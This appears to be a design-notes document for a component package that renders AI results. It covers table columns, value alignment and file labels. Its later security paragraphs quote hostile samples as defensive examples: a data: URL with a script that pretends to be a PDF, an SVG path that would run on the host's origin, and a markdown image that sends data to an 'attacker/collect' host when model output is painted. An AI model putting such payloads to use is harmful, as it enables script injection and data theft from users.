...
**Every list of records is a table**, and the ones a cell cannot hold expand. Falling back to a card per entry over the widest column was the wrong trade: a table is how a list of records is READ — scannable, aligned, one row each — and giving that up for prose or nesting lost it for every other column too. So the cell shows the first line (or how many entries there are), and the row expands to the whole record in the stacked layout, arriving only when asked for. The toggle appears only when a row HAS more to show — a cell that may be cut short, or a field the table does not show; a table of short scalars gets no column of chevrons that reveal nothing. The expanded panel is pinned to the scroller's width, because a detail spanning every column would otherwise inherit the table's and run off into the horizontal scroll.

**A list of records with one shape is a table.** Every entry has the same keys — that is what a table is. So the labels become column headers, stated once instead of once per row, and the type pills go with them. `recordColumns` decides it: any `object` element that declares a field. Which of those fields become columns is the budget's question, below.

**A record wider than the budget shows the top of a ranking, in authored order.** A column per field is right for four fields and wrong for twelve: the columns a reader decides on scrolled off to the right while the ones in view were often the least useful, and a list of invoice discrepancies read as a wide table with the item names cut off. So a table shows a set number of data columns, taken from the top of a ranking read off the descriptor alone (`chooseColumns`). First comes the record's **name**, its first `text` field in authored order, which is the same field a nested record's cell is named by. Next come the fields that **fit a cell whole** (`fitsACellWhole`: an enum, a number, a date, a boolean, a bounded `text`), the values a reader compares down a column and the ones that cost the table least width. Then any other `text` and every list of scalars, and last everything a cell could only reduce to a first line or a count: prose, a nested record, a list of records, a file. Within a tier the authored order decides. The ranking **selects and does not reorder**: the columns shown keep the order the author wrote them in, because authored order is a fact the descriptor carries deliberately. A row opens whenever a column is hidden, so a hidden field is one click away and never lost. A record within the budget is untouched: every field is a column, nothing is singled out, and the table renders exactly as it did before there was a budget.

**The budget is a count, not a measurement.** It is five unless the host says otherwise, on the provider: `<ResultEnvProvider tableColumns={8}>`, or `Infinity` for every column. A count renders the same table on a server, in jsdom and in a browser, where a budget measured off the panel would change the table's shape after hydration, and differently from one host to the next. Five columns of short values fit a method app's result panel, which is about 620px wide, once the name has its floor. Five columns that include a long enum or unbounded text can still be wider, and then the table scrolls, as below. A host that knows its panel is wide raises the count.

**A ranked table's name wraps above a floor, and is never cut.** It is the one cell that wraps rather than truncating, and the one without the cell cap. The name is what a reader identifies a row by, and a name cut at the cap is the fault the ranking was built for. A cell that wraps cannot push the table wider, so the cap has nothing to stop there, and the name takes the width the panel leaves it. Wrapping also makes it the one column auto table layout can take width back from, so in a narrow panel it is squeezed first, and without a floor it would be squeezed into a ribbon one word wide. Its floor is `16ch`, the one a chip column carries for the same reason. The floor costs a short name some empty width, and that is the trade, because CSS cannot size a table column to the smaller of its content and a length. Where the name sits is still the author's order, so in a panel too narrow for the columns shown it can sit past the right edge: it is then scrolled to, never cut.
...
**Prose and nesting are shown, not accommodated.** A paragraph in a `<td>` forces one column to the width of the longest answer, so a prose cell holds its first line and the row carries the rest; a structure is not a cell at any width, so a nested list's cell says how many entries it stands for, and a nested record's cell names it. `TABULAR_KINDS` decides which columns are shown WHOLE in their cell.
...
**And a one-line value sits at the RIGHT EDGE of its column.** Names vary in length and answers do not line up behind them, so a left-aligned value column leaves a ragged seam down the middle of the record and the eye has to find each answer again. Flushed right, the answers form one column the reader runs down — the same reason a receipt, a spec sheet and a settings panel all do it. Only the inline half gets this: anything that took the full-width branch (prose, a table, a gallery, a frame) reads left-to-right like the block it is, and right-aligning those would be aligning a block rather than an answer. A chip row follows through a `data-chips` hook, because a row of tags long enough to wrap fills the column, and tags starting under their label beside numbers ending at the right edge is the ragged seam again, one row lower.

**A value that wraps aligns left.** Right alignment is for an answer; a paragraph flushed right has a ragged left edge on every line, which is what a scorecard's ninety-word role summary looked like beside its label. The descriptor cannot say which a value will be, because an unbounded `text` holds a company name in one record and a paragraph in the next, and nothing needs to measure it either: the value cell is a flex row ending at the right, and the value inside it is a left-aligned box that is as wide as its content up to the column's width. A one-line value is narrower than the column and ends at its right edge; a value that wraps fills the column and reads left to right. `Outputs/Screening` pins both over the real run the fault was reported against.
...
**A wide table scrolls rather than crushing.** The budget keeps a record to a handful of columns, but a handful can still be wider than a narrow panel, and a host may raise the budget or lift it. The two ways to lose are to wrap a date over two lines to save a scrollbar, or to break the page's own width. So the table keeps a floor under each column, cells are one line with a cap and the full value on the `title` (a ranked table's name, above, is the one exception), and the container scrolls — focusable and named, because a scrollable region a keyboard cannot reach is an accessibility failure the a11y gate catches as `scrollable-region-focusable`. It is `role="group"` rather than `region`: a landmark per table would put every one of them in the document's landmark list, and two with the same name is `landmark-unique`.
...
**A file carried in its own URL is named by its format and its size.** A host that encodes a picked file in the browser, rather than uploading it first, writes the whole file into `url` as a `data:` URL, so a thirty-kilobyte PDF is a forty-thousand-character string with no path to take a name from. The result view's file label and the input control's subtitle under the file name both show `PDF · 36 KB` instead: `readDataUrl` in core reads the declared media type and counts the decoded size without decoding, and the format is named the way a dropzone's hint names it when it is one this package accepts. A reference that points somewhere is still printed, because it is worth copying, and the copy control still carries the `data:` URL whole. The two strings are host-overridable, `encodedFileSummary` and `fieldsCount` beside the other counts.
...
**A frame is stricter than a paint, and the reason is the origin.** `frameableUrl` admits `http:` and `https:` from anyone, and a same-origin path only from the host's RESOLVER. Markup goes through a sandbox because injecting it into the host's document would run it ON the host's origin with the host's cookies; a URL in an `<iframe>` is a separate document at its own origin, which is the browser's own boundary rather than one this package builds. **That argument is sound, and it used to be applied to a URL nobody had checked.** A `data:` document does not get an origin of its own — it inherits the embedder's — so `{url: "data:text/html,<script>…", filename: "report.pdf"}` was framed on the strength of its own filename, at the host's origin, with the host's cookies. Restricting the scheme restores the premise instead of compensating for its absence. A refused scheme costs a reader nothing: a raster `data:` URL is painted by the image arm, and a run does not return an inline PDF.

**A root-relative path carries no origin of its own either, which is why provenance decides it.** It is the embedding page's origin by construction — exactly what the resolver case (`/api/assets/…`) wants, and exactly what a payload must not be handed. Whether a preview is worth OFFERING is read from the declared type, and that type gate admits every `image/` subtype, SVG included; so a payload naming `{url: "/api/assets/x.svg", mime_type: "image/svg+xml"}` got a document with a DOM on the host's origin, and the `data:` SVG ban two paragraphs up was being paid around one function later. `paintable` already asks the resolver first, so it knows which answer it is holding and says so: a payload member must be `http:` or `https:` to be framed, while a host that resolves onto its own origin is choosing its own origin, which it is entitled to do. That entitlement is the residual risk the resolver contract names — see [upload-seam.md](upload-seam.md).
...
**A prose image does not phone home on paint.** `![](https://attacker/collect?…)` in a `prose` value is a request the browser makes as the result is painted — before anyone has read a word, with no click and no consent — and the entire content of that value is model output. So by default a markdown image renders as a **link** carrying its alt text (or the URL, when the model wrote none): nothing the model put there is lost, and the fetch waits for a reader who wants it. Inside a link it stays plain text instead, because `[![alt](img)](href)` — the linked-thumbnail spelling, which models write constantly — is a link token holding an image token, and an anchor inside an anchor is not valid HTML: the parser un-nests the pair into siblings, so a server-rendered page and the hydrated tree disagree and the visible link points at the image rather than the destination. Under the opt-in nothing has to change, because an `<img>` nests inside an anchor perfectly well. A host that knows where its prose images come from opts in once, on the provider:
